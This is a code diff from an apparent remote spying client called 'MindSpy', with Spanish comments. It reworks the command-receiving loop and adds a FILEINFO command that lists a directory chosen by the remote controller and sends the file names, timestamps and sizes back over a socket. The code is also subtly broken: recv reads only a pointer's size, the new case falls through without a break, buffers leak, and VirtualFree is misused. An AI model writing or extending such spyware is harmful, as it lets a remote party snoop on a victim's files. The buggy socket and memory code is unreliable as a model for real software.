@@ -36,7 +36,7 @@ namespace MindSpy
 		/*
 			La estructura de los paquetes a enviar, es siempre la misma, independientemente de
 			los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.
-			
+
 			Los primeros cuatro bytes del paquete, corresponden al tamaño del paquete. Los segundos
 			cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
 			se ubica la data a enviar.
@@ -50,9 +50,9 @@ namespace MindSpy
 		*(UINT32*)(DataToSend + 4) = comando;
 		// Se copia la data pasada por parámetro a la memoria reservada
 		if (Data)
-			memcpy(DataToSend+8, Data, SizeofData);
+			memcpy(DataToSend + 8, Data, SizeofData);
 		// Se envian los datos
-		bool r = send(sckt, (const char*)DataToSend, SizeofData+8, 0) != SOCKET_ERROR;
+		bool r = send(sckt, (const char*)DataToSend, SizeofData + 8, 0) != SOCKET_ERROR;
 		// Se libera la memoria
 		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
 		return r;
@@ -74,20 +74,33 @@ namespace MindSpy
 	{
 		while (true)
 		{
-			char Mensaje[MAX_BUFFER];
-			ZeroMemory(Mensaje, sizeof(Mensaje));
-			int resp = recv(sckt, Mensaje, sizeof(Mensaje), 0);
+			char *szBuff = (char*)malloc(1);
+			DWORD bDisponibles;
+			ioctlsocket(sckt, FIONREAD, &bDisponibles);
+			// si no los hay, ralentizamos y reiniciamos el ciclo
+			if (!bDisponibles)
+			{
+				Sleep(50);
+				continue;
+			}
+			else
+			{
+				szBuff = (char*)realloc(szBuff, bDisponibles);
+
+			}
+
+			int resp = recv(sckt, szBuff, sizeof(szBuff), 0);
 			if (resp <= 0)
 			{
 				Conectado = false;
 				break;
 			}
 
-			UINT32 comando = *(UINT32*)(Mensaje+4);
+			UINT32 comando = *(UINT32*)(szBuff + 4);
 
 			switch (comando)
 			{
-			case CLNT_CMDS::VERSION: 
+			case CLNT_CMDS::VERSION:
 				EnviarComando(strlen(VERSION_CLIENTE) + 1, CLNT_CMDS::VERSION, (BYTE*)VERSION_CLIENTE);
 				break;
 
@@ -99,9 +112,25 @@ namespace MindSpy
 				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
 				return;
 
+			case CLNT_CMDS::FILEINFO: {
+				FileSystem fs;
+				stFileInfoRequest * stfir = (stFileInfoRequest*)(szBuff +8);
+				stListaArchivos stla = fs.getDirContent(stfir->Path, stfir->Filtro, (ContentDir)stfir->Query, NULL);
+				DWORD SizeOfData = sizeof(UINT32) + stla.CantArchivos * (sizeof(WCHAR)*MAX_PATH) + (sizeof(long long) * 3);
+				BYTE*DataSend = (BYTE*)malloc(SizeOfData);
+				*(UINT32*)(DataSend) = stla.CantArchivos;
+				int OffsetWchar = sizeof(WCHAR)*MAX_PATH*stla.CantArchivos;
+				int OffsetLonglong = sizeof(long long) * stla.CantArchivos;
+				memcpy(DataSend + sizeof(UINT32), stla.Archivos, OffsetWchar);
+				memcpy(DataSend + sizeof(UINT32) + OffsetWchar, stla.FechasCreacion, OffsetLonglong);
+				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetLonglong, stla.FechasModificacion, OffsetLonglong);
+				memcpy(DataSend + sizeof(UINT32) + OffsetWchar + OffsetLonglong*2, stla.Tamaños, OffsetLonglong);
+				EnviarComando(SizeOfData, CLNT_CMDS::FILEINFO, DataSend);
+			}
+
 			case CLNT_CMDS::NAME:
 				break;
-				 
+
 			}
 		}
 	}
